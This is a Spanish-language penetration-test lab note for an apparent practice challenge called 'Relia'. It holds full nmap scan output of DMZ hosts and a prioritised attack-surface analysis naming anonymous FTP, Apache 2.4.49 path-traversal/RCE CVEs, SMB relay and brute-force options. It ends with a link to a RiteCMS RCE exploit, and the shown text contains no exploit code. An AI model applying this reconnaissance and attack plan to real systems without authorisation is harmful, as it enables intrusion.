# Challenge: Relia
## Fecha: 03/06/2025
> El tercer octeto de la ip suele cambiar al reiniciar el laboratorio
## IPs:
```bash
# DMZ red 1 
192.168.231.249 [x] LEGACY
192.168.231.248 [x] EXTERNAL
192.168.231.247 [x] WEB02
192.168.231.246 [x] DEMO
192.168.231.245 [x] WEB01
192.168.231.191 [x] LOGIN
192.168.231.189 [ ] MAIL

# RELIA - interna red 2
172.16.191.6  [ ]
172.16.xxx.7  [x]
172.16.191.21 [ ]
172.16.191.19 [ ]
172.16.191.15 [x] 
172.16.191.30 [ ]
172.16.191.14 [x]
172.16.191.20 [ ]
```
## Objetivo
We are tasked with a penetration test of Relia, an industrial company building driving systems for the timber industry. 
The target got attacked a few weeks ago and wants now to get an assessment of their IT security. 
Their goal is to determine if an attacker can breach the perimeter and get access to the domain controller in the internal network.

The organization topology diagram is shown below and the public subnet network resides in the 192.168.xx.0/24 range, 
where the xx of the third octet can be found under the IP ADDRESS field in the control panel.

## Herramientas
1. tool - 1 
2. tool - 2
## Procedimiento y comandos
#### Paso 1: Enumeracion de la DMZ
1. Enumeracion agresiva:
```bash
# Nmap 7.95 scan initiated Tue Jun  3 19:52:47 2025 as: /usr/lib/nmap/nmap -A -iL DMZ_ips.txt -oN enumerations/dmz-agresive.txt

# .249 LEGACY

Nmap scan report for 192.168.231.249
Host is up (0.15s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-06-03T22:55:19+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LEGACY
|   NetBIOS_Domain_Name: LEGACY
|   NetBIOS_Computer_Name: LEGACY
|   DNS_Domain_Name: LEGACY
|   DNS_Computer_Name: LEGACY
|   Product_Version: 10.0.20348
|_  System_Time: 2025-06-03T22:54:36+00:00
| ssl-cert: Subject: commonName=LEGACY
| Not valid before: 2025-06-02T21:40:45
|_Not valid after:  2025-12-02T21:40:45
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.30)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.231.249:8000/dashboard/
|_http-open-proxy: Proxy might be redirecting requests
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/3%OT=80%CT=1%CU=41425%PV=Y%DS=4%DC=T%G=Y%TM=683F7D62
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=I%CI=I%TS=A)SEQ(SP=10
OS:5%GCD=1%ISR=10A%TI=I%CI=I%TS=A)SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%TS=A)S
OS:EQ(SP=107%GCD=1%ISR=10E%TI=I%CI=I%TS=A)SEQ(SP=108%GCD=1%ISR=10A%TI=I%CI=
OS:I%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%
OS:O5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W
OS:6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0
OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-03T22:54:37
|_  start_date: N/A
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   196.74 ms 192.168.45.1
2   246.36 ms 192.168.45.254
3   156.65 ms 192.168.251.1
4   157.03 ms 192.168.231.249

# .248 EXTERNAL

Nmap scan report for 192.168.231.248
Host is up (0.15s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-robots.txt: 16 disallowed entries (15 shown)
| /*/ctl/ /admin/ /App_Browsers/ /App_Code/ /App_Data/ 
| /App_GlobalResources/ /bin/ /Components/ /Config/ /contest/ /controls/ 
|_/Documentation/ /HttpModules/ /Install/ /Providers/
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Home
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: EXTERNAL
|   NetBIOS_Domain_Name: EXTERNAL
|   NetBIOS_Computer_Name: EXTERNAL
|   DNS_Domain_Name: EXTERNAL
|   DNS_Computer_Name: EXTERNAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-06-03T22:54:24+00:00
| ssl-cert: Subject: commonName=EXTERNAL
| Not valid before: 2025-06-02T21:40:44
|_Not valid after:  2025-12-02T21:40:44
|_ssl-date: 2025-06-03T22:55:19+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/3%OT=80%CT=1%CU=33588%PV=Y%DS=4%DC=T%G=Y%TM=683F7D62
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=107%TI=I%CI=I%TS=A)SEQ(SP=10
OS:3%GCD=1%ISR=109%TI=I%CI=I%TS=A)SEQ(SP=106%GCD=1%ISR=10A%TI=I%CI=I%TS=A)S
OS:EQ(SP=108%GCD=1%ISR=10C%TI=I%CI=I%TS=A)SEQ(SP=FD%GCD=1%ISR=FA%TI=I%CI=I%
OS:TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5
OS:=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=
OS:FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S
OS:=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-time: 
|   date: 2025-06-03T22:54:30
|_  start_date: N/A

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   156.94 ms 192.168.231.248

# .247 WEB02

Nmap scan report for 192.168.231.247
Host is up (0.15s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: RELIA - New Hire Information
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_http-title: RELIA - New Hire Information
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WEB02
| Not valid before: 2025-04-23T04:53:29
|_Not valid after:  2025-10-23T04:53:29
| rdp-ntlm-info: 
|   Target_Name: WEB02
|   NetBIOS_Domain_Name: WEB02
|   NetBIOS_Computer_Name: WEB02
|   DNS_Domain_Name: WEB02
|   DNS_Computer_Name: WEB02
|   Product_Version: 10.0.20348
|_  System_Time: 2025-06-03T22:54:32+00:00
|_ssl-date: 2025-06-03T22:55:20+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/3%OT=80%CT=1%CU=37657%PV=Y%DS=4%DC=T%G=Y%TM=683F7D62
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=I%CI=I%TS=A)SEQ(SP=10
OS:6%GCD=1%ISR=104%TI=I%CI=I%TS=A)SEQ(SP=106%GCD=1%ISR=10D%TI=I%CI=I%TS=A)S
OS:EQ(SP=107%GCD=1%ISR=105%TI=I%CI=I%TS=A)SEQ(SP=FF%GCD=1%ISR=10A%TI=I%CI=I
OS:%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O
OS:5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6
OS:=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G
OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-03T22:54:40
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   157.01 ms 192.168.231.247

# .246

Nmap scan report for 192.168.231.246
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.52 ((Ubuntu))|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Code Validation
443/tcp  open  ssl/http Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=demo
| Subject Alternative Name: DNS:demo
| Not valid before: 2022-10-12T07:46:27
|_Not valid after:  2032-10-09T07:46:27
|_http-title: Code Validation
| tls-alpn: 
|_  http/1.1
2222/tcp open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 42:2d:8d:48:ad:10:dd:ff:70:25:8b:46:2e:5c:ff:1d (ECDSA)
|_  256 aa:4a:c3:27:b1:19:30:d7:63:91:96:ae:63:3c:07:dc (ED25519)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   156.95 ms 192.168.231.246

# .245 RELIA

Nmap scan report for 192.168.231.245
Host is up (0.16s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.239
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: RELIA Corp.
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
443/tcp  open  ssl/http Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
|_http-title: RELIA Corp.
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
| ssl-cert: Subject: commonName=web01.relia.com/organizationName=RELIA/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2022-10-12T08:55:44
|_Not valid after:  2032-10-09T08:55:44
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
2222/tcp open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 30:0c:6c:9b:ac:07:47:5e:df:6d:ff:38:63:38:2a:fd (RSA)
|   256 f3:a9:70:76:c8:d4:c4:17:f4:39:1f:be:58:9d:1f:a5 (ECDSA)
|_  256 21:a0:79:82:2d:e6:2a:76:11:24:2f:7e:2e:a8:c7:83 (ED25519)
8000/tcp open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: Host: RELIA; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   156.90 ms 192.168.231.245

# .191 LOGIN

Nmap scan report for 192.168.231.191
Host is up (0.15s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=192.168.231.191
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-06-03T22:55:18+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=login.relia.com
| Not valid before: 2025-06-02T21:40:52
|_Not valid after:  2025-12-02T21:40:52
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: LOGIN
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: login.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2025-06-03T22:54:31+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/3%OT=80%CT=1%CU=34306%PV=Y%DS=4%DC=T%G=Y%TM=683F7D62
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=FE%TI=I%CI=I%TS=A)SEQ(SP=102
OS:%GCD=1%ISR=10F%TI=I%CI=I%TS=A)SEQ(SP=103%GCD=1%ISR=103%TI=I%CI=I%TS=A)SE
OS:Q(SP=104%GCD=1%ISR=10E%TI=I%CI=I%TS=A)SEQ(SP=106%GCD=1%ISR=10A%TI=I%CI=I
OS:%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O
OS:5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6
OS:=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G
OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-03T22:54:47
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -2s

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   156.93 ms 192.168.231.191

# .189 MAIL

Nmap scan report for 192.168.231.189
Host is up (0.15s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: USER TOP UIDL
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: OK QUOTA completed CHILDREN NAMESPACE CAPABILITY IDLE ACL RIGHTS=texkA0001 IMAP4rev1 SORT IMAP4
445/tcp  open  microsoft-ds?
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/3%OT=25%CT=1%CU=35361%PV=Y%DS=4%DC=T%G=Y%TM=683F7D62
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=I%TS=A)SEQ(SP=10
OS:2%GCD=1%ISR=10F%TI=I%CI=I%TS=A)SEQ(SP=107%GCD=1%ISR=10B%TI=I%CI=I%TS=A)S
OS:EQ(SP=10A%GCD=1%ISR=10C%TI=I%CI=I%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11
OS:%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W
OS:2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW
OS:8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y
OS:%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR
OS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF
OS:=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: Host: MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-06-03T22:54:53
|_  start_date: N/A

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   156.94 ms 192.168.231.189


# .250 

Nmap scan report for 192.168.231.250
Host is up (0.15s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINPREP
|   NetBIOS_Domain_Name: WINPREP
|   NetBIOS_Computer_Name: WINPREP
|   DNS_Domain_Name: WINPREP
|   DNS_Computer_Name: WINPREP
|   Product_Version: 10.0.22000
|_  System_Time: 2025-06-03T22:54:28+00:00
| ssl-cert: Subject: commonName=WINPREP
| Not valid before: 2025-05-01T05:00:28
|_Not valid after:  2025-10-31T05:00:28
|_ssl-date: 2025-06-03T22:55:20+00:00; -1s from scanner time.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/3%OT=135%CT=1%CU=43383%PV=Y%DS=4%DC=T%G=Y%TM=683F7D6
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10A%TI=I%CI=I%TS=A)SEQ(SP=1
OS:03%GCD=1%ISR=10C%TI=I%CI=I%TS=A)SEQ(SP=103%GCD=1%ISR=10F%TI=I%CI=I%TS=A)
OS:SEQ(SP=104%GCD=1%ISR=10A%TI=I%CI=I%TS=A)SEQ(SP=105%GCD=1%ISR=10F%TI=I%CI
OS:=I%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11
OS:%O5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%
OS:W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%R
OS:D=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=
OS:0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID
OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2025-06-03T22:55:00
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   156.90 ms 192.168.231.250

Post-scan script results:
| clock-skew: 
|   -1s: 
|     192.168.231.248
|     192.168.231.191
|_    192.168.231.249
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

## üìä An√°lisis superficie de ataque priorizado.

### Hosts Ordenados por Prioridad de Ataque

#### PRIORIDAD ALTA

| IP | Hostname | Servicios Cr√≠ticos | Puertos | Responsabilidad | Vectores de Ataque |
|---|---|---|---|---|---|
| 192.168.231.245 | WEB01 | FTP (anon), HTTP, HTTPS, SSH | 21, 80, 443, 2222, 8000 | Web Server Principal | **FTP an√≥nimo**, Apache 2.4.49 (CVE conocidos), mod_wsgi Python, SSH en puerto no est√°ndar |
| 192.168.231.246 | demo | HTTP, HTTPS, SSH | 80, 443, 2222 | Servidor de Validaci√≥n | **Code Validation** app, SSH puerto no est√°ndar, posible upload/validation bypass |
| 192.168.231.249 | LEGACY | IIS, SMB, RDP, WinRM, XAMPP | 80, 135, 139, 445, 3389, 5985, 8000 | Servidor Legacy Windows | **XAMPP** dashboard, SMB shares, WinRM, m√©todo TRACE habilitado |

#### PRIORIDAD MEDIA

| IP | Hostname | Servicios Cr√≠ticos | Puertos | Responsabilidad | Vectores de Ataque |
|---|---|---|---|---|---|
| 192.168.231.247 | WEB02 | Apache, SMB, RDP, WinRM | 80, 135, 139, 443, 445, 3389, 5985 | Web Server Secundario | **RELIA New Hire Info**, PHP 8.1.10, SMB enumeration, cert expirado SSL |
| 192.168.231.248 | EXTERNAL | IIS, SMB, RDP, WinRM | 80, 135, 139, 445, 3389, 5985 | Servidor Externo | **robots.txt** con 16 entradas, SMB shares, WinRM, m√©todo TRACE |
| 192.168.231.191 | login.relia.com (LOGIN) | IIS, SMB, RDP, WinRM | 80, 135, 139, 445, 3389, 5985 | Servidor de Login | **HTTP Basic Auth**, dominio relia.com, SMB domain controller potencial |

#### PRIORIDAD BAJA

| IP | Hostname | Servicios Cr√≠ticos | Puertos | Responsabilidad | Vectores de Ataque |
|---|---|---|---|---|---|
| 192.168.231.189 | MAIL | SMTP, POP3, IMAP, SMB, WinRM | 25, 110, 135, 139, 143, 445, 587, 5985 | Servidor de Email | hMailServer, email enumeration, SMTP relay, SMB shares |
| 192.168.231.250 | WINPREP | SMB, RDP | 135, 139, 445, 3389 | Workstation/Prep | Windows 11 (build 22000), SMB shares, RDP |

### Vulnerabilidades Cr√≠ticas Identificadas

#### Inmediatas
- **192.168.231.245**: FTP an√≥nimo habilitado
- **192.168.231.249**: XAMPP dashboard expuesto en puerto 8000
- **192.168.231.191**: HTTP Basic Auth (posible brute force)

#### Apache Vulnerabilities
- **192.168.231.245**: Apache 2.4.49 - **CVE-2021-41773** (Path Traversal)
- **192.168.231.245**: Apache 2.4.49 - **CVE-2021-42013** (RCE)

#### Windows SMB
- Todos los hosts Windows tienen **SMB** sin firma requerida
- Posible **relay attacks** entre hosts del dominio

#### Estrategia de Enumeraci√≥n Recomendada

1. **Comenzar con 192.168.231.245**: FTP an√≥nimo + Apache vulnerable
2. **Enumerar 192.168.231.249**: XAMPP dashboard + SMB shares
3. **Verificar 192.168.231.246**: Aplicaci√≥n de validaci√≥n de c√≥digo
4. **SMB enumeration**: Todos los hosts Windows para shares y usuarios
5. **Web enumeration**: Dirb/Gobuster en todos los servicios HTTP/HTTPS

### Notas T√©cnicas

- **Dominio identificado**: relia.com
- **Sistemas operativos**: Mix Windows Server 2022 y Ubuntu
- **Puertos SSH no est√°ndar**: 2222 en hosts Linux
- **Certificados SSL**: Varios expirados o con CN incorrectos

Las pruebas sobre el servidor ftp dan como positivo el login anonimo pero los resultados **no ofrecen valor** _aun_.
No tenemos permisos para subir archivos, ni permisos de lectura de archivos.

Exploramos la posibilidad de Directory Traversal sin resultados.

Enumeramos directorios con gobuster y encontramos una ruta en **LEGACY** en el puerto 8000 que apunta a un cms **RiteCMS 3**
buscamos en [Exploit Database](https://www.exploit-db.com/exploits/50616) y encontramos un exploit para lograr **RCE** desde un usuario autenitcado.


